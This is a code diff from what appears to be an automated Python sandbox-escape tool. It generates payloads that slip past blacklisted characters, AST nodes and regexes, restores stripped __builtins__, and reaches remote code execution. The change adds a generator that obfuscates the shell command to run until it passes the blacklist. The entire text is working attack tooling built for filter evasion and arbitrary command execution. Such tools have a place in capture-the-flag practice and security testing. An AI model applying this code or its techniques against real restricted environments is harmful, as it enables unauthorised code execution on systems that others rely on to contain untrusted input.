@@ -178,7 +178,7 @@ def bypassMAIN(
     ]
 
     def try_to_restore(
-        data_name: str, check: object = None, end_of_prog=False, cmd=None
+        data_name: str, check: object = None, end_of_prog=False, cmd=None, bash_cmd=None
     ):
         """
         Try to obtain certain thing from the original scope.
@@ -220,6 +220,7 @@ Try to bypass blacklist with them. Please be paitent.",
                 allow_unicode_bypass,
                 tagged_scope,
                 cmd,
+                bash_cmd
             )
             if _:
                 success = False
@@ -412,9 +413,9 @@ Try to bypass blacklist with them. Please be paitent.",
         return all_colleted
 
     for i in string_ords:
-        if not is_blacklisted(f"'{chr(i)}'"):
+        if not is_blacklisted(f"'{chr(i)}'", ast_check_enabled=False) and chr(i) != "'":
             string_dict[chr(i)] = f"'{chr(i)}'"
-        elif not is_blacklisted(f'"{chr(i)}"'):
+        elif not is_blacklisted(f'"{chr(i)}"', ast_check_enabled=False) and chr(i) != '"':
             string_dict[chr(i)] = f'"{chr(i)}"'
     obj_list.sort(key=len)
     if not check_all_collected():
@@ -533,98 +534,89 @@ Try to bypass blacklist with them. Please be paitent.",
 
     # Step6: Restore builtins (if possible)
     if not is_builtins_rewrited:  # some thing was missing
-        if not change_in_builtins:
+        logger.info('[*] Restoring __builtins__ in this namespace.')
+        builtin_path = filter_path_list(
+            RCE_data["restore_builtins_in_current_ns"], tagged_scope
+        )
+        if builtin_path:
             logger.info(
-                "[*] __builtins__ in this namespace is not changed, no need to restore it."
+                "[*] %d paths found to restore builtins. \
+Try to bypass blacklist with them. Please be paitent.",
+                len(builtin_path),
             )
-        else:
-            logger.info(
-                "[*] builitins not fully available (%d is missing) \
-    in the namespace, try to restore them.",
-                len(change_in_builtins),
+            logger.debug("[*] restore paths: %s", str([i[0] for i in builtin_path]))
+            _ = try_bypasses(
+                builtin_path,
+                banned_chr,
+                banned_ast,
+                banned_re,
+                max_length,
+                allow_unicode_bypass,
+                tagged_scope,
             )
-            builtin_path = filter_path_list(
-                RCE_data["restore_builtins_in_current_ns"], tagged_scope
-            )
-            if builtin_path:
+            if _:
                 logger.info(
-                    "[*] %d paths found to restore builtins. \
-    Try to bypass blacklist with them. Please be paitent.",
-                    len(builtin_path),
+                    "[+] builtins restored. %d payload(s) in total.", len(_)
                 )
-                logger.debug("[*] restore paths: %s", str([i[0] for i in builtin_path]))
-                _ = try_bypasses(
-                    builtin_path,
-                    banned_chr,
-                    banned_ast,
-                    banned_re,
-                    max_length,
-                    allow_unicode_bypass,
-                    tagged_scope,
-                )
-                if _:
-                    logger.info(
-                        "[+] builtins restored. %d payload(s) in total.", len(_)
-                    )
-                    logger.debug("[*] payloads to restore builtins: ")
-                    logger.debug(_)
-                    builtin_dict_found_count, builtin_module_found_count = 0, 0
-                    builtin_dict_payload, builtin_module_payload = None, None
-                    for i in _:
-                        check_result = exec_with_returns(i, original_scope)
-                        original_scope.pop("__return__", None)
-                        if check_result == __builtins__ and type(check_result) == dict:
-                            if not builtin_dict_found_count:
-                                logger.info(
-                                    "[*] Using %s as the restored builtins dict.", i
-                                )
-                                tagged_scope[i] = [check_result, "BUILTINS_SET"]
-                                builtin_dict_payload = i
-                                tags.append("BUILTINS_SET")
-                                generated_path["BUILTINS_SET"] = i
-                            builtin_dict_found_count += 1
-                        elif (
-                            check_result == builtins
-                            and type(check_result) == ModuleType
-                        ):
-                            if not builtin_module_found_count:
-                                logger.info(
-                                    "[*] Using %s as the restored builtins module.", i
-                                )
-                                tagged_scope[i] = [check_result, "MODULE_BUILTINS"]
-                                builtin_module_payload = i
-                                tags.append("MODULE_BUILTINS")
-                                generated_path["MODULE_BUILTINS"] = i
-                            builtin_module_found_count += 1
-                        else:
-                            if (
-                                not check_result == builtins
-                                and not check_result == __builtins__
-                            ):
-                                logger.debug("[!] %s is not the restored builtins.", i)
-                    achivements["builtins set"] = [
-                        builtin_dict_payload,
-                        builtin_dict_found_count,
-                    ]
-                    achivements["builtins module"] = [
-                        builtin_module_payload,
-                        builtin_module_found_count,
-                    ]
-                    if not builtin_dict_payload and not builtin_module_payload:
-                        logger.info(
-                            "[-] no way to find a bypass method to restore builtins."
-                        )
+                logger.debug("[*] payloads to restore builtins: ")
+                logger.debug(_)
+                builtin_dict_found_count, builtin_module_found_count = 0, 0
+                builtin_dict_payload, builtin_module_payload = None, None
+                for i in _:
+                    check_result = exec_with_returns(i, original_scope)
+                    original_scope.pop("__return__", None)
+                    if check_result == __builtins__ and type(check_result) == dict:
+                        if not builtin_dict_found_count:
+                            logger.info(
+                                "[*] Using %s as the restored builtins dict.", i
+                            )
+                            tagged_scope[i] = [check_result, "BUILTINS_SET"]
+                            builtin_dict_payload = i
+                            tags.append("BUILTINS_SET")
+                            generated_path["BUILTINS_SET"] = i
+                        builtin_dict_found_count += 1
+                    elif (
+                        check_result == builtins
+                        and type(check_result) == ModuleType
+                    ):
+                        if not builtin_module_found_count:
+                            logger.info(
+                                "[*] Using %s as the restored builtins module.", i
+                            )
+                            tagged_scope[i] = [check_result, "MODULE_BUILTINS"]
+                            builtin_module_payload = i
+                            tags.append("MODULE_BUILTINS")
+                            generated_path["MODULE_BUILTINS"] = i
+                        builtin_module_found_count += 1
                     else:
-                        if interactive and not is_builtins_rewrited:
-                            try_to_restore(
-                                "builtins2RCEinput", end_of_prog=True
-                            )  # try to RCE directly with builtins
-                else:
+                        if (
+                            not check_result == builtins
+                            and not check_result == __builtins__
+                        ):
+                            logger.debug("[!] %s is not the restored builtins.", i)
+                achivements["builtins set"] = [
+                    builtin_dict_payload,
+                    builtin_dict_found_count,
+                ]
+                achivements["builtins module"] = [
+                    builtin_module_payload,
+                    builtin_module_found_count,
+                ]
+                if not builtin_dict_payload and not builtin_module_payload:
                     logger.info(
                         "[-] no way to find a bypass method to restore builtins."
                     )
+                else:
+                    if interactive and not is_builtins_rewrited:
+                        try_to_restore(
+                            "builtins2RCEinput", end_of_prog=True
+                        )  # try to RCE directly with builtins
             else:
-                logger.info("[-] no paths found to restore builtins.")
+                logger.info(
+                    "[-] no way to find a bypass method to restore builtins."
+                )
+        else:
+            logger.info("[-] no paths found to restore builtins.")
     else:
         logger.info(
             "[*] __builtins__ in this namespace is deleted, no way to restore it."
@@ -835,6 +827,7 @@ def bypassRCE(
     if cmd == "":
         logger.critical("[!] command is empty, nothing to execute.")
         exit(1)
+
     generated_path = bypassMAIN(
         local_scope,
         banned_chr=banned_chr,
@@ -849,7 +842,17 @@ def bypassRCE(
         print_all_payload=print_all_payload,
         log_level=log_level,
     )
-    try_to_restore("__import__2RCE", end_of_prog=True, cmd=cmd)
+
+    bash_cmd = None
+    command_bypasser = BashBypassGenerator()
+    for i in command_bypasser.Generate(cmd):
+        if i is not None:
+            if not is_blacklisted(i, ast_check_enabled=False):
+                logger.info("[+] Using %s as the command to execute.", i)
+                bash_cmd = i
+                break
+            
+    try_to_restore("__import__2RCE", end_of_prog=True, cmd=cmd, bash_cmd=bash_cmd)
 
     return bypasses_output(generated_path=generated_path)
 
